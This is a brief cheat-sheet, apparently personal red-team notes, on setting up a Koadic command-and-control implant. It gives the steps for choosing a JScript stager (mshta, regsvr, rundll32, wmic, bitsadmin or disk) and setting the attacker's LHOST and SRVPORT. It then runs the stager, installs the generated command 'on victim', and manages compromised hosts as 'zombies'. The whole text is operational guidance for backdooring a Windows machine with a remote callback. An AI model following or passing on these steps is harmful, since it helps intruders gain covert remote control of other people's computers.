Setting up an implant with koadic:

./koadic

1. Command: `use stager/js/<entry from list below>`
    - bitsadmin
    - disk
    - mshta
    - regsvr
    - rundll32
    - wmic
2. Set LHOST, SRVPORT
3. Command: `run` and note down the command that was given to you
4. Install on victim using the exploit used from the list with the command that was given in the terminal
5. Command: `zombies <ID>` If this was the first stager made, the ID is 0, but run `zombies` without an ID to list all stagers